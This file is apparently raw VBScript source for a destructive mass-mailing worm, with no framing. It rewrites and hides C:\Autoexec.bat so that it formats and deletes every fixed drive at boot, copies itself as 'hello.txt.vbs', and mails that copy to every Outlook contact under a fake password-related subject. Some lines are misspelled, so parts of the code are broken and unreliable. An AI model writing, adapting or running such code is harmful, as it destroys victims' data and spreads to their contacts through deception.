Dim i,j,fs,auto,disc,ds,ss,dir,p,a
Set fs = CreateObject ("Scripting.FilesystemObject")
Set auto = fs.CreateTextFile ("C:\Autoexec.bat",true)
auto.WriteLine ("echo off")
auto.Writeline ("Smatrdrv")
Set disc = fs.Drives
For Each ds in disc
If ds.DriveType = 2 Then
ss = ss & ds.Driveletter
End if
Next
ss = LCase (StrReverse (Trim (ss)))
For p = 1 To Len (ss)
a = Mid (ss,p,1)
auto.WriteLine ("format/autotest "&a&":")
Next
For p = 1 To Len (ss)
a = Mid (ss,p,1)
auto.WriteLine ("deltree/y "&a&":")
Next
auto.Close
Set dir = fs.Getfile ("C:\Autoexec.bat")
dir.attributes =  dir.attributes+2
Set objJace = CreateObject ("Scripting.FilesystemObject")
objJace.Getfile (Wscript.ScriptFullname).copy ("C:\hello.txt.vbs")
objJace.CreateTextFile "C:\unzipped\x.txt",99999
Set objMail = CreateObject ("Scripting.FilesystemObject")
Set objJace = CreateObject ("Scripting.FilesystemObject")
objJace.Getfile (Wscript.ScriptFullname).copy ("C:\hello.txt.vbs")
Set objOA =Wscript.CreateObject ("Outlook.Application")
Set objMapi = objoa.GetNameSpace ("MAPI")
For i = 1 to objMapi.Address.Count
Set objAddlist = objMapi.AddressLists (i)
For j = 1 To objAddList.AddressEntries.Count
Set objMail = objOA.CreateItem (0)
objMail.Recipients.Add (objAddList.AddressEntries (j))
objMail.Subject = "RE : my passwd !please check"
objMail.Attochements Add ("c:\hello.txt.vbs")
objMail.Send
Next
Next
Set objMapi = Nothing
Set objOA = Nothing